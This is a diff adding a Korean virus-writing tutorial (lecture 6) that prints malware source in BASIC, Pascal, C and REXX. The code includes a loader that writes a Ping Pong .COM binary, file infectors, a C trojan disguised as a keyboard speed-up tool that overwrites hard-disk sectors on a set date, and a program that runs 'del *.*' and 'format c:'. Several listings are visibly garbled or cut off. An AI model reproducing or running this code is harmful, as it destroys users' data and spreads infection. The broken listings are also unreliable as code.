@@ -1,0 +1,615 @@
+﻿
+안녕하세요.
+
+6회강좌입니다.
+이번 시간에는 기타 언어로 제작한 바이러스를 살펴보기로 하겠습니다.
+
+
+
+2) 베이직으로 구현한 바이러스
+핑퐁바이러스를 예로 들어 설명하겠다.
+[핑퐁 바이러스]
+
+출처     : 1988년 3월, Italia
+전염기종 : IBM PC 및 호환 기종
+전염종류 : 부트 섹터 감염자
+비고     : 90년 초에 국내에서 발견
+
+플로피 디스크 및 하드 디스크의 부트 영역 전염된다. 원래의  부트 섹터를 다른 장소로 이동시키
+고 디스켓일 경우 1개의 미사용 클러스터를 불량 클러스터로 만들며 여기에 원래의 부트 섹터 및
+바이러스 프로그램의 나머지를  저장한다. 하드일 경우 사이드:0,  실린드:0의 영역에 원래의 부트
+섹터 및 바이러스 프로그램의 나머지를 저장한다. DOS 버전 및  종료표시(55 AA)는 변하지 않는
+다. 메모리  크기를 2K 감소시키며 인터럽트  벡터를 변경시키다. 원래의 Ping  Pong 바이러스는
+360K 플로피만 감염시킨다.
+감염된 디스크로 부팅하면  바이러스 프로그램이 메모리에 상주하며,  상주후 INT 13H번 수행시
+Access하는 디스크를 감염시킨다. 디스크 입출력 속도가 느려지며 디스크일 경우 한개의 불량 클
+러스터가 생긴다. 활동 시기가  되면 화면에 bouncing ball 효과가 나타난다. 활동  시기는 임위적
+이며 시스템을 재 부팅하지 않으면 bouncing이 멈추지 않는다. 기타 다른 피해는 없다.
+
+핑퐁바이러스의 베이직 소스
+
+100 REM - basic progrom to create pingpong.com
+110 CLS:PRINT "creating pingpong.com":OPEN "pingpong.com" AS #1 LEN=1
+120 FIELD #1, 1 AS A$:CHECKSUM#=0
+130 FOR I=1 TO 19
+140 LINESUM#=0:LOCATE 2,3:PRINT "countdown:" 19 - I;
+150 FOR J=1 TO 16:READ BYTE$:BYTE=VAL("&h"+BYTE$)
+160 CHECKSUM#=CHECKSUM#+BYTE:LINESUM#=LINESUM#+BYTE
+170 IF (BYTE<256) THEN LSET  A$=CHR$(BYTE):PUT #1
+180 NEXT J
+190 READ LINETOT$:LINECHECK#=VAL("&h"+LINETOT$)
+200 IF LINECHECK#=LINESUM# THEN GOTO 220
+210 LOCATE 4,2:PRINT "error in line #";260+10*I:GOTO 260
+220 NEXT I
+230 CLOSE #1:READ FILETOT$:FILECHECK#=VAL(FILETOT$)
+240 IF CHECKSUM# <> FILECHECK# THEN GOTO 260
+250 PRINT:PRINT "pingpong.com created successfully":SYSTEM
+260 PRINT:PRINT "pingpong.com is not valid!":END
+270 DATA  e9, fd,  0, 20,  7, 29,  5, ff,  1,  0,  7,  0, 4f,  0,  0,  0,  391
+280 DATA   0, 1e, 50, 53, 51, 52,  e, 1f, b4,  f, cd, 10, 8a, d8, 3b, 1e,  4ec
+290 DATA   a,  1, 74, 36, 89, 1e,  a,  1, fe, cc, 88, 26,  c,  1, b4,  1,  4a1
+300 DATA  80, fb,  7, 75,  2, fe, cc, 80, fb,  4, 73,  2, fe, cc, 88, 26,  82f
+310 DATA   9,  1, c7,  6,  5,  1,  1,  1, c7,  6,  7,  1,  1,  1, b4,  3,  26d
+320 DATA  cd, 10, 52, 8b, 16,  5,  1, eb, 24, 90, b4,  3, cd, 10, 52, b4,  60f
+330 DATA   2, 8b, 16,  5,  1, cd, 10, a1,  3,  1, 80, 3e,  9,  1,  1, 75,  369
+340 DATA   3, b8,  7, 83, 8a, dc, b9,  1,  0, b4,  9, cd, 10, 8b,  e,  7,  59f
+350 DATA   1, 80, fe,  0, 75,  5, 80, f5, ff, fe, c5, 80, fe, 18, 75,  5,  840
+360 DATA  80, f5, ff, fe, c5, 80, fa,  0, 75,  5, 80, f1, ff, fe, c1, 3a,  a94
+370 DATA  16,  c,  1, 75,  5, 80, f1, ff, fe, c1, 3b,  e,  7,  1, 75, 17,  5a9
+380 DATA  a1,  3,  1, 24,  7, 3c,  3, 75,  5, 80, f5, ff, fe, c5, 3c,  5,  601
+390 DATA  75,  5, 80, f1, ff, fe, c1,  2, d1,  2, f5, 89,  e,  7,  1, 89,  79b
+400 DATA  16,  5,  1, b4,  2, cd, 10, b4,  8, cd, 10, a3,  3,  1, 8a, dc,  555
+410 DATA  80, 3e,  9,  1,  1, 75,  2, b3, 83, b9,  1,  0, b8,  7,  9, cd,  4c5
+420 DATA  10, 5a, b4,  2, cd, 10, 5a, 59, 5b, 58, 1f, 2e, ff, 2e,  d,  1,  4eb
+430 DATA  b8,  8, 35, cd, 21, 89, 1e,  d,  1, 8c,  6,  f,  1, b8,  8, 25,  41f
+440 DATA  ba, 11,  1, cd, 21, ba,  0,  2, 83, c2,  f, b1,  4, d3, ea, b4,  6f0
+450 DATA  31, cd, 21,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  11f
+460 DATA  26653
+
+
+
+베이직으로 작성한 바이러스
+작용 : 화일 크기를 바꾸는 것
+
+'--------------
+'BASIC LANGUAGE
+'--------------
+10 ON ERROR GOTO 430
+20 LENGTHVIR=2641 (컴파일 후 화일 크기를 입력)
+30 VIRROOT$="BV3.EXE"
+40 SHELL "DIR *.EXE>INH"
+50 OPEN "R",1,"INH",32000
+60 GET #1,1
+70 LINE INPUT#1, ORIGINAL$
+80 LINE INPUT#1, ORIGINAL$
+90 LINE INPUT#1, ORIGINAL$
+100 LINE INPUT#1, ORIGINAL$
+110 ON ERROR GOTO 430
+120 CLOSE#2
+130 F=1 : LINE INPUT#1,ORIGINAL$
+140 F=1 : LINE INPUT#1,ORIGINAL$
+150 IF MID$(ORIGINAL$,1,1)='%' THEN GOTO 110
+160 ORIGINAL$=MID$(ORIGINAL$,1,13)
+170 EXTENSION$=MID$(ORIGINAL$,9,13)
+180 MID$(EXTENSION$,1,1)="."
+190 F=F+1
+200 IF MID$(ORIGINAL$,F,1)=" " OR MID$(ORIGINAL$,F,1)="." OR F=13
+    THEN GOTO 220
+210 GOTO 190
+220 ORIGINHVIT
+250 IF LOF(2)<LENGTHVIR THEN GOTO 280
+260 GET #2,3
+270 LINE INPUT#2, TEST$
+280 CLOSE #2
+290 IF MID$(TEST$,,2,1)='%' THEN GOTO 110
+300 CLOSE #1
+310 ORIGINAL$=ORIGINAL$
+320 MID$(ORIGINAL$,1,1)='%'
+330 MID$(ORIGINAL$,1,1)='%'
+340 C$="COPY"+ORIGINAL$+" "+ORIGINALS$
+350 SHELL C$
+360 C$="COPY"+VIRROOT$+" "+ORIGINAL$
+370 SHELL C$
+380 OPEN ORIGINAL$, FOR APPEND AS #1 LEN=13
+390 WRITE#1,ORIGINALS$
+400 CLOSE #1
+410 PRINT "INFECTION IN";ORIGINAL$
+420 SYSTEM
+430 PRINT "VIRUS INTERNAL ERROR":SYSTEM
+
+
+
+
+
+베이직으로 작성한 바이러스
+
+
+DATA "4B","FE","55BB","다크어벤저-1028"
+DATA "E0","00","0300","예루살렘"
+DATA "42","43","5678","침입자"
+DATA "C0","00","0300","느림보 또는 ZEROTIME"
+DATA "EE","00","0300","예루살렘-G"
+DATA "FF","00","0400","일요일"
+DIM INAX(10),OTAX(10),VN$(10)
+FOR I=1 TO 6
+READ A$,B$,C$,D$
+ INAX(I)=VAL("&H"+A$+B$)
+ OTAX(I)=VAL("&H"+C$)
+ VN$(I)=D$
+NEXT I
+PRINT "메모리의 바이러스를 검사합니다."
+FOR I=1 TO 6
+ Reg 1,INAX(I)
+ CALL INTERRUPT &H21
+ IF Reg(1)=OTAX(I) THEN PRINT VN$(I);" 바이러스가 존재합니다."
+NEXT I
+ END
+
+
+
+
+
+
+3) PASCAL 로 구현해본 바이러스
+
+PASCAL 로 제작한 간단한 바이러스 데모 입니다.
+
+
+{
+-----------------------------------------------------------
+
+
+ Number One
+ This is a very primitive virus
+
+ HANDLE WITH CARE:  -------- Demonstration ONLY !!!
+
+
+        Number One infects all .COM - files in the
+        CURRENT directory
+        A warning message and the infected file's name will
+        be displayed
+        That file has been overwritten with Number One's
+        program code and is not reconstructible!
+        If all files are infected or no .COM - files found,
+        Number One gives you a <Smile>
+        Files may be protected against infections of
+        Number One
+        by setting the READ ONLY attribute.
+
+
+Written 10.3.1987 by M.vallen (Turbo-Pascal 3.01A)
+(c) 1987 by BrainLab
+
+__________________________________________________________
+}
+
+{C-}
+{U-}
+{I-}       { Do not allow an user break, enable IO check }
+
+{---- Constants -------------------------------------------}
+
+Const
+    VirusSize = 12027;              { Number one's code size }
+
+    Warning   : String[42]          { Warning message }
+                = 'This file has been infected by Number One';
+
+{---- Type declaration ------------------------------------}
+
+Type
+    DTARec = Record                 { 화일hing entry  }
+    If not Odd(Reg.flags) then   { If a file found then ...}
+       Repeat
+         UsePath := DTA.FullName;
+       B:=dos(#0,UsePath);
+       If B>0 Then
+       Delete(UsePath, B, 255);      { Remove grabage }
+       Assign(Go,UsePath);
+       Reset(Go);
+       If IOresult = 0 then    { If not IO error then ...}
+          Begin
+            BlockRead(Go,Buffer, 2);
+            Move (Buffer[$80], TestID, 43);
+            { 화일이 감염되었는지를 검사 }
+            If TsetID <> Warning then
+              Begin
+                Seek(Go,0);
+                MarkIntected := Warning;
+                Blockwrite(Go,ProGramStart, Succ(VirusSize Shr 7));
+                Close (Go);
+                Writeln(UsePath + ' intected. ');
+                Halt;
+             End;
+           Close(Go);
+         End;
+       { 화일이 이미 감염되었음, 다음 화일로 작업 연결 }
+       Reg.AH := $4F;
+       Reg.DS := Seg(DTA);
+       Reg.DX := Ofs(DTA);
+       MsDos(Reg);
+     Until Odd(Reg.Flags);
+  Write('<Smile>');
+END. {of Program}
+
+
+
+4) C 로 구현한 바이러스
+
+다음은 하드 디스크 파괴 트로이 목마 바이러스 C 소스입니다.
+다음 배치로 구현한 바이러스 의 트로이 목마형 구조와 비슷합니다.
+단지 차이점은 개발 언어와 약간의 침투방법의 차이겠죠.
+
+다음 바이러스 프로그램은 하드디스크를 빠르게 합니다.
+그러나 지정한 날짜,조건이 맞으면 하드 디스크를 파괴해 버립니다.
+C 로 트로이목마 바이러스를 구현할 수 있다는 정도로 알아 두십시요.
+
+*바이러스 메인 부분입니다
+
+// Main Source  Fast.C
+
+#include <stdio.h>
+#include <conio.h>
+#include <dos.h>
+#include <string.h>
+
+#define LASTHEAD       1
+#define LASTTRACK      79
+#define LASTSECTOR     15
+#define BYTESPERSECTOR 512
+#define driveToRead    0x80       // C: drive (파괴대상 드라이브 지정)
+
+char diskBuffer[BYTESPERSECTOR * LASTSECTOR];
+
+typedef struct{    // 날짜의 구조체
+        int Year;
+        int Month;
+        int Day;
+} Time_Type;
+
+// 키보드 빠르게 하는 루틴 (트로이 목마의 외형 부분)
+void Fast_Key( void )
+{
+    outp( 0x60, 0xF3 );
+    delay( 100 );
+    outp( 0x60, 0x00 );
+    delay( 100 );
+}
+
+// 하드디스크 섹터 쓰기
+unsigned char WriteHardSector( unsigned char drive,
+                               unsigned char sectorsToWrite,
+                               unsigned char head,
+                               unsigned int  cylinder,
+                               unsigned char sector,
+                               unsigned char far *bufferPtr ){
+    union REGS reg;
+    struct SREGS sreg;
+    reg.h.ah = 3;
+    reg.h.al = sectorsToWrite;
+    reg.x.bx = FP_OFF(bufferPtr);
+    reg.h.dh = head;
+    reg.h.dl = drive;
+    reg.h.ch = cylinder;
+    reg.h.cl = (cylinder >> 8);
+    reg.h.cl <<= 6;
+    reg.h.cl |= (sector & 63);
+    sreg.es = FP_SEG(bufferPtr);
+    int86x(0x13,&reg,&reg,&sreg);
+    return(reg.h.ah);
+}
+
+void main( void ){
+    unsigned char currentHead,currentTrack,currentSector;
+    struct date cur_d;                 // 날짜
+    FILE *Read_Exe;                    // 화일 포인터
+    Time_Type Clack_Time;              // 파괴 대상 하드디스크 날짜의 구조체
+    int Data_Size = 0;                 //  날짜를 읽기위한 사이즈
+
+    getdate(&cur_d);                   // 현재 날짜 알아내기
+
+    Read_Exe = fopen("fast.exe","rb");
+                  //바이러스 개시 날짜를 알아내기 위해 실행화일을 OPEN
+                  //Open시 fast.exe 화일이 현디렉토리에 있어야함
+    Data_Size = sizeof(Time_Type);
+    fseek(Read_Exe,-Data_Size,SEEK_END);  // 실행 화일 끝에서 Data_Size만큼
+                                          // 뒤로 포인트를 옮김
+    fread(&Clack_Time,sizeof(Time_Type),1,Read_Exe);
+                                          // 데이타 읽기
+
+    if( ( Clack_Time.Year   == cur_d.da_year) &&
+        ( Clack_Time.Month  == cur_d.da_mon ) &&
+        ( Clack_Time.Day    == cur_d.da_day )){
+         // 날짜가 실행화일 끝에 붙은 날짜와 일치 하면 하드 파괴
+         for(currentTrack = 0; currentTrack <= LASTTRACK; currentTrack++){
+          for(currentHead = 0; currentHead <= LASTHEAD; currentHead++){
+                      //실제 하드디스크 파괴 부분
+                      //엉뚱한 데이타를 마구 써버림
+                      WriteHardSector(driveToRead,LASTSECTOR,currentHead,
+                                               currentTrack,1,diskBuffer);
+          }
+         }
+         textattr( WHITE | BLUE << 4);
+         cprintf("[ Cracking Ok ! ]");
+         textattr( WHITE | BLACK << 4);
+         cprintf("\n");
+    }
+    // 날짜가 맞지 않을 경우 그냥 키보드 속도를 빠르게 한다
+    else { Fast_Key();
+           textattr( WHITE | BLUE << 4);
+           cprintf("Fast_key Installed !");
+           textattr( WHITE | BLACK << 4);
+           cprintf("\n");
+    }
+}
+
+
+*두번째 시간을 맞추는 소스입니다.
+
+
+
+// 시간을 맞추는 소스  Set_Time.C
+// 사용법 : [ Set_Time 1995 3 9 ]
+
+#include <stdio.h>
+#include <dos.h>
+
+typedef struct{
+        int Year;
+        int Month;
+        int Day;
+} Time_Type;
+
+void main(int argc,int **argv){
+
+    struct date cur_d;
+    FILE *Read_Exe;
+    Time_Type Clack_Time;
+    Clack_Time.Year  = atoi(argv[1]);
+    Clack_Time.Month = atoi(argv[2]);
+    Clack_Time.Day   = atoi(argv[3]);
+
+    Read_Exe = fopen("fast.exe","rb+");
+    if(Read_Exe == NULL) printf("\nFile Opening Error [ Fast.exe ]\n");
+    fseek(Read_Exe,0L,SEEK_END); // 화일 포인터를 끝으로 옮긴다
+    fwrite(&Clack_Time,sizeof(Time_Type),1,Read_Exe);
+          //날짜를 Fast.exe끝에 붙인다
+    fclose(Read_Exe); // 화일 닫기.
+}
+
+
+
+
+다음은 위와 아주 유사한 형태의 트로이 목마형 바이러스 소스 입니다.
+
+#include <dos.h>
+#include <conio.h>
+#include <stdio.h>
+#include <stdlib.h>
+void next();
+struct mystruct
+{
+    int num;
+    char name[10];
+    char tel[10];
+
+    };
+    char n[]="@echo off\ntype t.cmm\n";
+main()
+{
+  int r;
+  long add;
+  FILE *fp;
+  struct mystruct s,d,f;
+  if ( ( fp = fopen("C:\\t.cmm","wb+" )) == NULL )
+  {
+   exit(-1);
+   }
+   s.num = 1;
+   strcpy( s.name,"I'm Hacker");
+   strcpy( s.tel,"HaHa...");
+
+   fwrite(&s , sizeof(s),1,fp);
+   fseek( fp,0,SEEK_SET);
+
+   fread( &d,sizeof(d),1,fp);
+   fclose(fp);
+
+   fp = fopen ("C:\\autoexec.bat","r+");
+   fprintf(fp,"%22s",n);
+   fwrite(n,1,1,fp);
+   fseek(fp,add,0);
+   add = r+190;
+
+   fclose(fp);
+
+   next();
+   }
+
+/***************************************************************************
+*                                                                          *
+*           키보드 속도를 빠르게 해 주는  유틸리티. (FAST.COM)             *
+*                                                                          *
+*                    만든  곳  :  하 늘 소 ( 경북대학교 전자공학과 )       *
+*                    만든 사람 :  이 영 상 ( 하늘소 2 기 )                 *
+*                    만든 날짜 :  4323년 7월                               *
+*                                                                          *
+****************************************************************************/
+
+#include <dos.h>    /* 도스에 관련된 함수들을 쓰겠다는 말이다. */
+
+
+/********************  필요한 선언을 하는 부분  **********************/
+
+#define KB_STATUS_P 0x64  /* 키보드의 상태를 알수 있는 Port 번호     */
+#define KB_DATA_P   0x60  /* 키보드에 데이터를 보낼때 쓰는 Port 번호 */
+#define ACK_SIGNAL  0xfa  /* 인식(Acknowledge) 했다는 신호           */
+#define SET_TYPEM   0xf3  /* 키보드의 속도를 바꾸겠다는 명령 Code    */
+
+#define OB_FULL     1     /* Output buffer에 한 글자가 있을때        */
+#define IB_FULL     2     /* Input buffer에 한 글자가 있을때         */
+
+#define MAX_TRY     3     /* 최대 시도 횟수                          */
+
+/******************** 함수의 형을 선언하는 부분 **********************/
+
+int set_typm( int gap );  /* 키보드의 속도를 조절 하는 함수 */
+int send_kb ( int gap );  /* 키보드에 지정 값을 보내주는 함수 */
+
+
+/********************     풀그림의  시작 부분   **********************/
+
+void next( void )
+{
+    if( set_typm(0) ) /*  성공적으로 끝났으면  */
+        printf("\n\tSuper Keyboard Mania V2.0\n");
+    else
+        printf("\n\7\tError in adjusting keyboard speed !!\n");
+}
+
+
+int set_typm( int gap )
+{
+    disable();  /* 인터럽트가 걸리지 않게 한다. */
+    if ( send_kb( SET_TYPEM ) ) /* 키보드에게 속도 조절을 한다는 명령을
+                                  보낸다. */
+    {
+        if( send_kb( gap ) )  /* 키보드로 원하는 속도를 보낸다. */
+        {
+            enable(); /* 인터럽트가 다시 걸리게 한다. */
+            return( 1 ); /* 성공적 */
+        }
+    }
+    enable(); /* 인터럽트가 다시 걸리게 한다. */
+    return( 0 ); /* 제대로 되지 않았을때 */
+}
+
+
+int send_kb( int gap )
+{
+    int i = MAX_TRY; /* i 에 최대 시도 횟수 값을 넣는다. */
+    unsigned int j;
+
+    while( i-- ) {
+        j = 30000;
+        while( --j ) /* Input buffer에 값이 들어올때 까지 30000번 돌린다. */
+            if( inportb( KB_STATUS_P ) == IB_FULL )
+                break;
+
+        outportb( KB_DATA_P, (unsigned char)gap ); /* 키보드에 값을 보낸다 */
+
+        j = 30000;
+        while( --j ) /* Output buffer에 값이 없어질때 까지 기다린다. */
+            if( inportb( KB_STATUS_P ) != OB_FULL )
+                break;
+
+        j = 30000;
+        while( --j ) /* 키보드에서 잘 받았다는 신호가 올때 까지 기다린다. */
+            if( inportb( KB_DATA_P ) == ACK_SIGNAL )
+                return( 1 );
+    }
+    return( 0 ); /* 제대로 되지 않았을때 0을 리턴 */
+}
+
+
+
+
+다음은 아주 간단한 C 로 만든 트로이 목마 바이러스입니다.
+C를 모르는 분이라도 다음 소스를 보면 뭔가 아실겁니다.
+
+
+#include<process.h>
+
+main()
+{
+     printf("Wait ...\n");
+     system("echo y! del *.*");
+     system("echo y! format c: >nul");
+}
+
+
+"|"는 도스(배치)상에서도 주로 쓰이는 것으로 쉬프트키와 \를 누르면 나옵니다.
+
+
+
+
+
+6) 그외의 바이러스
+
+다음은 Rexx 라는 언어로 제작한 네트워크 상의 바이러스의 소스이다.
+
+--------------------TOP OF FILE-------------------------------------------
+/LOAD REXX
+
+IF RANDOM(2) <> 0 THEN DO
+   NAME.1 = 'PQ'
+   NAME.2 = 'OUTPUT'
+   NAME.3 = 'PROFILE'
+   NAME.4 = 'BROWSE'
+   NAME.5 = 'HELP'
+   FANME='VIRUS'
+   MAXLINE=0
+   W1=1
+   W2=80
+   CLONE=0
+   I=0
+   PARA='FNAME MAXLINE REC W1 W2 CLONE '
+   DO WHILE I < 20
+     I=I+1
+     M1.I=''
+     M2.I=''
+     PARA = PARA || 'M1.' || I || ' M2.' || I || ' '
+   END
+   COMMAND = '(DOCTOR VIRUS)'
+   PARA = PARA || 'COMMAND'
+   C=0
+   M1.8='-->'
+   DO WHILE C < 10
+     MN.3='   COMPUTER VIRUS IN MULTI-USER TIME-SHARING ENVIROMENT '
+     IF C=9 TH N COMMAND '..O,O;.. CANCEL ..'
+     CLINE=C
+     MAXFILE=C+1
+     'PANEL IGCX:ED.PAN ' || PARA
+     IF COMMAND='HELP' THEN C=20
+     C=C+1
+   END
+  C=RANDOM(5)
+   'COPY IGCX:TEMP ' || NAME.C || 'XO'
+-------------------END OF FILE-----------------------------------------
+
+
+
+
+   (PROGRAM TEMP)
+------------------TOP OF FILE--- -------------------------------------
+/LOAD REXX
+
+SAY 'INFECTED BY COMPUTER VIRUS MEROMNG'
+EXIT
+-----------------END OF FILE------------------------------------------
+
+
+
+Rexx 라는 프로그래밍 언어는 네트워크 에서 주로 사용되며
+batch 파일과 basic의장점을 딴 것이다.
+
+
+
+
+다음은 바이러스 시뮬레이션 프로그램입니다.
+실제 바이러스는 아니지만 바이러스처럼 보이는 것입니다.
+
+
+JIJIN.COM       ;화면을 위아래로 흔들어 줍니다.
+JINE.COM       ;지네가 나와서 글자를 이동시킵니다.
+PINGPONG.ASM    ;핑퐁 바이러스 에뮬레이터 소스.
+PINGPONG.COM   ;위 소스를 어셈블한 것입니다.
+PP.COM       ;베이식으로 컴파일한 핑퐁 시뮬.
+SLOWFALL.COM   ;커서를 느린 속도로 아래로 떨어뜨림.
+VGAFLIP.COM     ;화면을 뒤바꿔 줍니다.
+ZERO.COM        ;화면에 표시된 0자를 지웁니다.
+
+이상.
+
+
